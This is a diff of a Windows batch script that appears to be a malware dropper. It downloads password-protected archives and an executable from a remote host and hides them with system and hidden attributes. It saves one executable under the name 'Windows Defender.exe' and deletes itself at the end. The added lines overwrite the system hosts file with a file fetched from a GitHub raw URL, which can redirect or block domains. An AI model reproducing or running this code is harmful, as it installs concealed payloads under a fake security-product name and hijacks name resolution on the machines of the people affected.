@@ -63,6 +63,8 @@ if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\c
    "%environment%\curl.exe" -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
 )
 
+"%environment%\curl.exe" -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"
+
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" 
 endlocal
 DEL /s /f /q /a "%~f0"
